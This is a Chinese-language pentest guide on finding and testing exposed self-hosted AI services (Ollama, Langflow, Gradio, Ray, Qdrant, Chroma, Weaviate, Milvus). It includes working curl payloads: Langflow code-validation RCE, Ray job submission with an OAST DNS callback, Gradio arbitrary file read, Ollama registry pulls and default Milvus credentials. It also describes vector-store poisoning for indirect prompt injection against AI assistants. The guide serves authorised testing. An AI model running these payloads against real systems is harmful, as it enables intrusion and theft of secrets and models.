# 暴露的自托管 AI 服务

{{#include ../banners/hacktricks-training.md}}

构建 AI 功能的团队通常会自行运行模型运行器、agent 构建器、演示 UI、计算集群和向量数据库。许多此类工具原本是为笔记本电脑或封闭的实验室网络设计的，因此**默认没有身份验证**，或者启用了身份验证快捷方式。当攻击者可以访问此类服务时，影响通常属于以下几类：

- 免费使用 GPU 和模型，并窃取私有模型。
- 提示词、文档和嵌入内容泄露。
- 进程环境中的机密泄露（LLM 提供商密钥、云凭据）。
- 代码执行，因为其中一些 API 将运行代码作为**功能**提供。

本页介绍如何发现这些服务，以及针对各类 API 应测试的内容。有关加固自托管推理服务器以及 llama.cpp `/slots` leak，请参阅 [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening)。有关恶意模型文件，请参阅 [AI Models RCE](AI-Models-RCE.md)。

## 指纹识别

无需凭据即可发送以下请求。返回包含预期字段的 JSON 响应即可识别产品，通常还能识别版本，从而确定适用以下哪些检查项。端口为文档中列出的默认端口，或官方运行示例中使用的端口。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| 产品 | 常见端口 | 未经身份验证的请求 | 可用于识别的特征 |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | 版本 JSON、本地模型列表 |
| Langflow | 7860 | `GET /api/v1/version` | Langflow 版本 JSON |
| Gradio | 7860 | `GET /config` | 包含 Gradio 版本和组件 ID 的应用配置 |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`、已提交任务列表 |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | 心跳值、Chroma 版本 |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant 版本、集合列表 |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate 版本、类列表 |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | 集合列表，或身份验证错误 |

这些服务也经常通过反向代理在路径前缀下公开（例如 `/ollama/` 或 `/ray/`），因此应针对在 JavaScript 包或 API 文档中找到的任何前缀重复发送请求。

## 未经身份验证的推理和模型管理 API

模型运行器通常通过单个 REST API 同时提供推理路由和管理路由。Ollama 就是一个很好的例子。它没有内置身份验证，默认绑定到 `127.0.0.1:11434`，而 `OLLAMA_HOST` 可以更改绑定地址。<sup>[[1]](#references)[[15]](#references)</sup> 官方 Docker 镜像在容器内设置 `OLLAMA_HOST=0.0.0.0:11434`，声明 `EXPOSE 11434`，且没有 `USER` 指令，因此服务器在容器中以 root 身份运行。<sup>[[16]](#references)</sup> `EXPOSE` 不会在主机上发布该端口，因此主机是否可访问取决于部署方式。文档中的 `docker run` 命令使用 `-p 11434:11434`，而 Docker 会将此类映射发布到所有主机接口，除非指定主机 IP。<sup>[[17]](#references)[[18]](#references)</sup>

各组路由可能对攻击者造成的影响：<sup>[[2]](#references)</sup>

| 路由 | 未经身份验证时的影响 |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | 本地模型和已加载模型的列表，包括私有自定义模型 |
| `POST /api/show` | 模型详情，包括 Modelfile、模板和**系统提示词** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | 免费使用受害者硬件进行推理 |
| `POST /api/pull`, `/api/push` | 让服务器从攻击者指定的 registry 下载模型，或向其上传模型 |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | 创建、覆盖或删除模型 |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

无需凭据即可返回模型列表，本身就足以证明存在暴露。自定义模型通常会在 `/api/show` 中包含内部 system prompt。向你的主机发起 pull，证明服务器会从攻击者指定的 registry 获取 manifest。向你的 registry 发起 `/api/push`，则会将暴露转化为模型窃取。不要在真实目标上调用 create 或 delete 路由。

Registry pull 也是一种解析器攻击面，因为服务器会使用远程 manifest 中的值来存储 blobs。在 Probllama（CVE-2024-37032，已在 Ollama 0.1.34 中修复）中，manifest 的 `digest` 被用作文件名，且未经过验证。因此，恶意 registry 可以利用 `../` 序列在 blobs 目录之外写入文件。攻击者植入一个 digest 指向本地文件的 manifest 并将其推送后，就能把该文件 leak 到攻击者的 registry。Wiz 在 Docker 中实现了 RCE，因为服务器以 root 身份运行：他们写入一个共享库并将其加入 `/etc/ld.so.preload`，然后调用 `/api/chat`，使新进程加载该库。<sup>[[15]](#references)</sup> 当 runner 可以从任意 registry 拉取内容时，应检查它如何将 manifest 字段转换为路径。

## 按设计执行代码的 API

### 作业提交 API

分布式计算框架将代码执行作为其主要功能。Ray Jobs API 在 dashboard 端口（8265）接受 `entrypoint` shell 命令，并在集群上运行该命令。<sup>[[19]](#references)</sup> Oligo ShadowRay 研究报告称，Jobs API 没有授权机制，且 dashboard 绑定到 `0.0.0.0`。相关的 CVE-2023-48022 存在争议，因为 Ray 预期只在受控网络中运行。<sup>[[20]](#references)</sup> Ray 在 2.52.0 中增加了可选的 token 身份验证（`RAY_AUTH_MODE=token`）。对于通过 `ray.init()` 启动的本地集群，Ray 2.59 默认启用该功能；但如果没有可用的 token，`ray start --head` 仍可在未验证身份的情况下启动。Ray 文档说明，计划在 2.61 中更广泛地默认启用身份验证，因此应检查已部署的版本和启动模式，不要想当然地认为 dashboard 是开放的。<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

这类 Dashboard 在旧版本中还有值得探测的辅助路由。Ray 2.8.1 之前，`/log_proxy?url=` 会获取任意 HTTP(S) URL（可通过 SSRF 访问云元数据），而 `/api/v0/logs/file` 接受任意 `filename` 路径；这两个接口都没有身份验证。<sup>[[8]](#references)</sup>

### 执行函数定义的代码“验证”端点

接受自定义 Python 组件的 Agent 构建器有时会通过使用 `ast` 解析代码，并用 `exec()` 仅运行函数定义来“验证”代码。这并不安全。Python 在定义函数时会计算 **装饰器和默认参数值**，因此即使函数体从未运行，放在这些位置的代码也会执行。Langflow 的 `POST /api/v1/validate/code` 就采用了这种方式，而且在 1.3.0 之前无需身份验证（CVE-2025-3248）。通过引发一个包含命令输出的异常，可以让端点在响应中返回输出：<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

测试所有会编译、lint 或“检查”用户代码的端点，并优先使用 DNS callback 作为证明。

### 自动登录和默认超级用户令牌路由

单用户工具通常会附带一个快捷功能，让每位访客都以管理员身份登录。在 Langflow 中，启用 `AUTO_LOGIN` 后，任何调用者都可以通过 `GET /api/v1/auto_login` 获取默认超级用户的令牌。禁用该功能时，该路由会返回 `Auto login is disabled.`。<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 至 1.10.0 默认启用此功能（CVE-2026-9103）。将其与上文需要身份验证的代码验证路由串联起来，即可恢复未授权 RCE（CVE-2026-9198，由 Harish Kolla 报告）。<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> 当前官方发布包和 Docker 镜像会禁用自动登录，并要求设置超级用户密码，但开发分支仍保持启用状态。<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

即使无法执行代码，superuser token 也能访问所有 flow 和存储的 provider credentials。有关自动化测试中的相关前置检查，请参阅 [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md)。

## ML demo UI 中的文件服务和 RPC 路由

ML demo 框架通过通用路由提供上传和生成的文件，并允许前端调用服务器端组件辅助函数。Gradio 为此公开了 `/config`、`/upload` 和 `/file=<path>`。<sup>[[5]](#references)</sup> 在任何类似框架上都值得测试以下两种模式：

- **从上传子目录进行路径遍历：**如果文件路由只检查路径是否以临时文件夹为起始位置，可先上传文件以创建子目录，然后使用 `../` 或 `%2e%2e%2f` 向上跳出该目录。Gradio 4.0 到 4.10（CVE-2023-51449）存在此漏洞。<sup>[[26]](#references)[[27]](#references)</sup> 使用 `curl --path-as-is` 发送请求，避免客户端规范化路径。
- **任意方法分派：**如果某个端点使用用户输入调用 `getattr(component, fn_name)`，攻击者就能调用内部辅助函数。在 4.13.0 之前，Gradio 的 `/component_server` 就是如此。在 4.3 到 4.12 中，`move_resource_to_block_cache` 会将任意本地文件复制到缓存中，之后可通过 `/file=` 下载。在 3.47 到 3.50.2 中，其他辅助函数可实现文件读取和完整读取型 SSRF。<sup>[[26]](#references)[[28]](#references)</sup> 对于未标记为服务器函数的辅助函数，修复后的服务器会返回 `Function not found.`。<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

在 Hugging Face Spaces 上，Space secrets 是环境变量，因此 `/proc/self/environ` 是最有价值的文件。Horizon3 使用 HTTP `Range` header 读取了它。<sup>[[26]](#references)</sup>

## RAG 使用的向量数据库

RAG 会将原始文档的分块、嵌入向量和元数据存储在向量数据库中，然后由 assistant 将排名靠前的结果放入 prompt。因此，读取权限会 leak **私有文档的纯文本内容**。写入权限则允许攻击者插入分块，这些分块之后可能会被检索并放入其他用户的 prompt 中，从而造成持久化的间接 prompt injection（参见 [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)）。

对于自托管向量数据库，请检查是否配置了身份验证，或是否启用了匿名访问：

- **Qdrant**：自行部署的实例会在所有网络接口上监听，且没有身份验证。配置后，密钥通过 `api-key` header 或 `Authorization: Bearer` 传递。也可以使用只读密钥和按 collection 设置的密钥。<sup>[[11]](#references)</sup>
- **Chroma**：默认禁用身份验证。Token 身份验证使用 `Authorization` 或 `X-Chroma-Token`。<sup>[[29]](#references)</sup>
- **Weaviate**：启用匿名访问时，不带凭据的请求会以 `user: anonymous` 身份通过身份验证，并获得该用户拥有的权限。<sup>[[30]](#references)</sup>
- **Milvus**：除非 `common.security.authorizationEnabled` 为 `true`，否则不会启用身份验证。启用后，默认 `root` 用户的密码为 `Milvus`，token 格式为 `username:password`。<sup>[[31]](#references)[[14]](#references)</sup>

无需凭据即可获得包含私有数据的响应，说明存在暴露风险。若已启用身份验证，请另外检查是否仍在使用未更改的默认账户：<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

检查 payload 是否包含文档文本、用户标识符或 tenant 名称。为证明具有写入权限，同时避免污染生产数据，可创建并立即删除一个名称明确的空集合，但仅限授权范围允许时。

这些服务器上的身份验证也可能发生得太晚。在 Chroma 的 Python FastAPI 服务器中（1.0.0 至至少 1.5.8，CVE-2026-45829），创建集合的路由会在身份验证检查之前构建客户端提供的 embedding function。即使请求被拒绝，引用攻击者控制且设置了 `trust_remote_code: true` 的 Hugging Face 模型的配置也会运行攻击者的代码。Rust frontend 不受影响。<sup>[[32]](#references)</sup> 如果请求携带模型或插件配置，请在不提供凭据的情况下进行测试，并观察是否向你的模型仓库发出出站请求。

## References

- [1] [Ollama 常见问题](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API 文档](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow 源码 - API v1 endpoints](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio 源码 - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio 源码 - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray 源码 - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray，版本 2.6.3、2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma 源码 - Python 客户端默认设置](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma 源码 - FastAPI 服务器路由](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - 安全](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI 规范](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI 规范](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - 连接到 Milvus Server](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama：Ollama 远程代码执行漏洞 (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker 文档](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - 发布和暴露端口](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay：首个已知的针对 AI 工作负载、并在野外被利用的攻击活动](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token 身份验证](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - 速度再快也不安全：滥用 Python Exec，在 Langflow AI 中实现未授权 RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow 源码 - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - 利用 Gradio 文件读取漏洞窃取 Hugging Face Spaces 中的机密](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio 公告 GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio 对 `/component_server` 的修复提交](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma 原生身份验证](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - 身份验证](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - 验证用户访问权限](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast 在身份验证前运行](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM 安全公告 - 通过绕过自动登录和代码验证实现未认证远程代码执行 (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
{{#include ../banners/hacktricks-training.md}}
